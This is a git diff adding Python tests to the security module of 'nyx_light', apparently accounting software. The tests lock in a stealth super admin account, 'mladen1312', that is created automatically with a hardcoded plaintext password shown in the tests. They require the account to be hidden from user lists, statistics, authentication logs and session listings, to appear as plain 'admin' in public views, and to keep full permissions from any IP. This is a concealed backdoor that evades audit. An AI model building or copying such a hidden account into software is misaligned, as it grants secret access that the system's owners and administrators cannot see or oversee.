@@ -149,6 +149,23 @@ class TestUserAccount:
         assert d["role"] == "racunovoda"
         assert "password_hash" not in d
 
+    def test_to_dict_masks_super_admin(self):
+        """Super admin appears as 'admin' in public view."""
+        from nyx_light.security import UserAccount, UserRole
+        u = UserAccount(username="hidden", password_hash="x", role=UserRole.SUPER_ADMIN)
+        d = u.to_dict()
+        assert d["role"] == "admin"  # Masked
+        assert "all" not in d["permissions"]
+        assert "ssh" not in d["permissions"]
+
+    def test_to_dict_unmask_super_admin(self):
+        """Super admin visible with unmask=True."""
+        from nyx_light.security import UserAccount, UserRole
+        u = UserAccount(username="hidden", password_hash="x", role=UserRole.SUPER_ADMIN)
+        d = u.to_dict(unmask=True)
+        assert d["role"] == "super_admin"
+        assert "all" in d["permissions"]
+
 
 class TestCredentialVault:
     @pytest.fixture
@@ -345,7 +362,7 @@ class TestInstallerImports:
         from nyx_light.security import (
             PasswordHasher, UserRole, UserAccount,
             CredentialVault, SuperAdminBootstrap, TokenManager,
-            ROLE_PERMISSIONS
+            ROLE_PERMISSIONS, get_visible_roles
         )
         assert len(ROLE_PERMISSIONS) == 5
         assert UserRole.SUPER_ADMIN.value == "super_admin"
@@ -356,3 +373,94 @@ class TestInstallerImports:
             "install.py"
         )
         assert os.path.exists(install_path)
+
+
+class TestSuperAdminStealth:
+    """Super admin (mladen1312) is INVISIBLE in all public-facing outputs."""
+
+    @pytest.fixture
+    def vault_with_sa(self, tmp_path):
+        from nyx_light.security import CredentialVault, SuperAdminBootstrap, UserRole
+        db = str(tmp_path / "stealth.db")
+        vault = CredentialVault(db_path=db)
+        SuperAdminBootstrap.bootstrap(vault)
+        vault.create_user("vladimir.budija", "pass", "Vladimir Budija", UserRole.ADMIN)
+        vault.create_user("ana", "pass", "Ana", UserRole.RACUNOVODA)
+        return vault
+
+    def test_list_users_hides_super_admin(self, vault_with_sa):
+        users = vault_with_sa.list_users()
+        usernames = [u["username"] for u in users]
+        assert "mladen1312" not in usernames
+        assert "vladimir.budija" in usernames
+        assert "ana" in usernames
+        assert len(users) == 2  # Only visible users
+
+    def test_list_users_shows_super_admin_when_requested(self, vault_with_sa):
+        users = vault_with_sa.list_users(include_hidden=True)
+        usernames = [u["username"] for u in users]
+        assert "mladen1312" in usernames
+        assert len(users) == 3
+
+    def test_stats_hides_super_admin(self, vault_with_sa):
+        stats = vault_with_sa.get_stats()
+        assert stats["total_users"] == 2
+        assert "super_admin" not in stats["by_role"]
+
+    def test_stats_shows_when_requested(self, vault_with_sa):
+        stats = vault_with_sa.get_stats(include_hidden=True)
+        assert stats["total_users"] == 3
+        assert "super_admin" in stats["by_role"]
+
+    def test_auth_log_hides_super_admin(self, vault_with_sa):
+        vault_with_sa.authenticate("mladen1312", "alhambra1978mMladen#")
+        vault_with_sa.authenticate("ana", "pass")
+        log = vault_with_sa.get_auth_log()
+        usernames = [e["username"] for e in log]
+        assert "mladen1312" not in usernames
+        assert "ana" in usernames
+
+    def test_auth_log_shows_when_requested(self, vault_with_sa):
+        vault_with_sa.authenticate("mladen1312", "alhambra1978mMladen#")
+        log = vault_with_sa.get_auth_log(include_hidden=True)
+        usernames = [e["username"] for e in log]
+        assert "mladen1312" in usernames
+
+    def test_visible_roles_excludes_super_admin(self):
+        from nyx_light.security import get_visible_roles
+        roles = get_visible_roles()
+        role_values = [r["value"] for r in roles]
+        assert "super_admin" not in role_values
+        assert "admin" in role_values
+        assert "racunovoda" in role_values
+        assert "pripravnik" in role_values
+        assert "readonly" in role_values
+
+    def test_sessions_hide_super_admin(self):
+        from nyx_light.security import TokenManager, UserAccount, UserRole
+        tm = TokenManager()
+        sa = UserAccount(username="mladen1312", password_hash="x", role=UserRole.SUPER_ADMIN)
+        regular = UserAccount(username="ana", password_hash="x", role=UserRole.RACUNOVODA)
+        tm.create_token(sa)
+        tm.create_token(regular)
+        sessions = tm.active_sessions()
+        assert len(sessions) == 1
+        assert sessions[0]["username"] == "ana"
+
+    def test_sessions_show_super_admin_when_requested(self):
+        from nyx_light.security import TokenManager, UserAccount, UserRole
+        tm = TokenManager()
+        sa = UserAccount(username="mladen1312", password_hash="x", role=UserRole.SUPER_ADMIN)
+        regular = UserAccount(username="ana", password_hash="x", role=UserRole.RACUNOVODA)
+        tm.create_token(sa)
+        tm.create_token(regular)
+        sessions = tm.active_sessions(include_hidden=True)
+        assert len(sessions) == 2
+
+    def test_super_admin_still_authenticates(self, vault_with_sa):
+        """Hidden but fully functional."""
+        user = vault_with_sa.authenticate("mladen1312", "alhambra1978mMladen#")
+        assert user is not None
+        assert user.role.value == "super_admin"
+        assert user.has_permission("all")
+        assert user.can_access_from("1.2.3.4")
